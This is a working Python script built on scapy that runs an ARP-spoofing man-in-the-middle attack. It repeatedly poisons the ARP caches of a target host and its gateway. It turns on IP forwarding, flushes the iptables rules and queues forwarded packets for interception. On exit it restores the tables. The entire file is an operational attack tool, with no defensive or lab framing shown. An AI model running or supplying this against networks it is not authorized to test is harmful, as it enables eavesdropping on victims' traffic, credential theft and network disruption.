#!/usr/bin/env python3

import time
import scapy.all as scapy
import sys
import os
import argparse


def get_Args():
    parser = argparse.ArgumentParser(prog="Arp-spoofer",
                                     usage="-t target | -s spoof_ip",
                                     description="ARP MITM attack",
                                     add_help=True)

    parser.add_argument("-t", "--target", dest="target_ip",
                        help="Target Host IP address :")
    parser.add_argument("-s", "--spoof", dest="spoof_ip",
                        help="IP address to spoof (ie router) :")

    options = parser.parse_args()
    if options.target_ip is None or options.spoof_ip is None:
        print(parser.print_help())
        sys.exit(0)

    else:
        return options


def get_mac(ip):

    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broadcast = broadcast/arp_req
    # print(arp_req_broadcast.summary())
    answer_list = scapy.srp(arp_req_broadcast, timeout=1, verbose=0)[0]

    return answer_list[0][1].hwsrc


def restore_tables(destination_ip, source_ip):
    hw_dst = get_mac(destination_ip)
    hw_src = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=hw_dst,
                       psrc=source_ip, hwsrc=hw_src)
    scapy.send(packet, verbose=False, count=4)


def spoof(target_ip, gw_ip):
    hw_target = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=hw_target, psrc=gw_ip)
    scapy.send(packet, verbose=False)


def fw_on():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    os.system("iptables -F")
    os.system("iptables -F -t nat")
    os.system("iptables -P FORWARD ACCEPT")
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 1")
    os.system("iptables-legacy -F")
    os.system("iptables-legacy -F -t nat")
    os.system("iptables-legacy -P FORWARD ACCEPT")
    os.system("iptables-legacy -I FORWARD -j NFQUEUE --queue-num 1")
    return


def fw_off():

    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    os.system("iptables-restore < /root/iptables")
    os.system("iptables-legacy-restore < /root/iptables-legacy")
    return


packet_Count = 0

options = get_Args()

try:

    print("[+] Setting up iptables rules ... done")
    fw_on()

    while True:

        spoof(options.target_ip, options.spoof_ip)
        spoof(options.spoof_ip, options.target_ip)
        packet_Count += 2
        print("\r[+] Packets sent: " + str(packet_Count), end='\n',
              flush=False)
# sys.stdout.flush() python2 only ...
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[*] Restoring iptables rules ... please wait ... Done !")
    fw_off()
    restore_tables(options.target_ip, options.spoof_ip)
    restore_tables(options.spoof_ip, options.target_ip)
    print("\n[*] Restoring tables.. please wait ... Done !")
